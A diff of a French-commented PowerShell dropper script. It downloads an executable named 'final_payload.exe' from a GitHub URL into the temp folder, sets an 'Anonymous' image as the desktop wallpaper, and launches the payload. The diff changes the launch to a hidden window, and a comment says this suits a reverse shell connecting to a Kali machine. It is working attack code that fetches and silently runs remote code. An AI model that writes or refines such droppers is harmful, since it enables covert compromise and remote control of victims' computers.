@@ -2,9 +2,7 @@
 
 # --- 0. Définition des Chemins et URLs ---
 $TempPath = "$env:TEMP"
-# Lien RAW de votre payload corrigé
 $PayloadUrl = "https://raw.githubusercontent.com/FogBound-IT/test/main/final_payload.exe"
-# Lien RAW de l'image Anonymous (selon votre premier script)
 $ImageAnonUrl = "https://raw.githubusercontent.com/FogBound-IT/test/793235c441ddaec513ddb5699b33a2cff3b285aa/thumb-1920-423529.jpg"
 $PayloadDest = "$TempPath\pld.exe"
 $ImageDest = "$TempPath\anonymous.jpg"
@@ -20,7 +18,6 @@ Try {
 } Catch { Exit 1 }
 
 # --- 3. Définir le fond d'écran via C# (Méthode robuste) ---
-# Nécessaire pour forcer la mise à jour sans RUNDLL32 parfois capricieux
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -35,14 +32,15 @@ public class Wallpaper {
     }
 }
 "@
-# Définir le style (2 = Étiré, 0 = Non en mosaïque)
 Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value "2"
 Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value "0"
 Try {
     [Wallpaper]::SetDesktopWallpaper($ImageDest)
 } Catch {}
 
-# --- 4. Lancer le payload (Connexion à la Kali) ---
-Start-Process $PayloadDest
+# --- 4. Lancer le payload (Connexion à la Kali) de manière discrète ---
+# L'utilisation de Start-Process avec la propriété -WindowStyle Hidden garantit que le payload
+# s'exécute en arrière-plan sans fenêtre visible, ce qui est idéal pour un reverse shell.
+Start-Process -FilePath $PayloadDest -WindowStyle Hidden
 
-# Le script se termine ici (silencieusement).
+# Le script se termine ici.
